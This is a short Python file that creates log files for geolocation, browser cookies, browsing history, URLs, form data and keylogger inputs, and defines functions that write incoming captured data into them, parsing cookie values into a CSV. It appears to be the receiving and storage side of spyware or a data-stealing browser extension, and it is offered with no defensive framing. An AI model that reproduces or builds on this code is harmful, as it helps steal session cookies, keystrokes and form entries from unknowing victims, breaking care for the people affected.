import os
import pandas as pd
import json


a = __file__
a = a[:-6]+"logs\\"
print(a)
Geo_file = a + "geo.txt"
Cks_file = a + "cookies.csv"
his_file = a + "historial.txt"
url_file = a + "URL.txt"
FD_file  = a + "Form_Data.txt"
KLg_file = a + "keylogger_inputs.txt"
Files = [Geo_file,Cks_file,his_file,url_file,FD_file,KLg_file]
DFiles = {"Geo": 0, "Coo": 1, "His": 2, "Url": 3, "Form": 4, "Key": 5}

def main():

    for i in Files:

        f = open(i, "w")
        f.close()

    df = pd.DataFrame(columns=["domain","sameSite","secure","value"])
    df.to_csv(Cks_file, index=False)
def CookiesLog(raw):

    raws = json.loads(raw.decode("utf-8")+"\n")
    df = pd.read_csv(Cks_file)
    for raw in raws:
        print(raw)
        data = []
        data.append(raw["domain"])
        data.append(raw["sameSite"])
        data.append(raw["secure"])
        data.append(raw["value"])
        data = pd.DataFrame([data], columns=["domain","sameSite","secure","value"])
        print(data)
        df = df.append(data, ignore_index=True)
    
    df.to_csv(Cks_file, index=False)

def log(file, data):
    file = DFiles[file]
    file = Files[file]
    if file == Cks_file:
        CookiesLog(data)
    else:
        f = open(file, "a")
        f.write(data.decode("utf-8")+"\n")
        f.close
    pass